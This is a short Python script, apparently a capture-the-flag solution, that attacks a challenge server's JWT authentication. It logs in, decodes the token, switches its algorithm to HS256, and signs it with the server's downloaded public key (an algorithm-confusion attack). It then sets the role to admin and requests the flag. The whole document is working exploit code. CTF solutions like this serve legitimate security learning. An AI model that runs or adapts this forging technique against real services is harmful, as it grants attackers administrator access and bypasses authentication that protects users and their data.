#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import base64
import json

# Set up
s = requests.Session()

url = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login'
data = {'username': 'minion', 'password': 'banana'}
res = s.post(url, data=data)

accessToken = res.json()['accessToken']

# Inspect the token
def decode(x):
    padding = (4 - len(x) % 4) % 4 * '='
    return base64.urlsafe_b64decode(x + padding).decode('utf-8')


parts = accessToken.split('.')
header, body = list(map(lambda x: json.loads(decode(x)), parts[:2]))
print('Original:', header, body)

# Forge the token
header['alg'] = 'HS256'
body['role'] = 'admin'

url = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem'
key = requests.get(url).text

import jwt
forged = jwt.encode(body, headers=header, key=key, algorithm='HS256').decode()

# Get the flag!
url = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock'
headers = {
    'Authorization': f'Bearer {forged}'
}
res = s.get(url, headers=headers).text
print('Flag:', res)
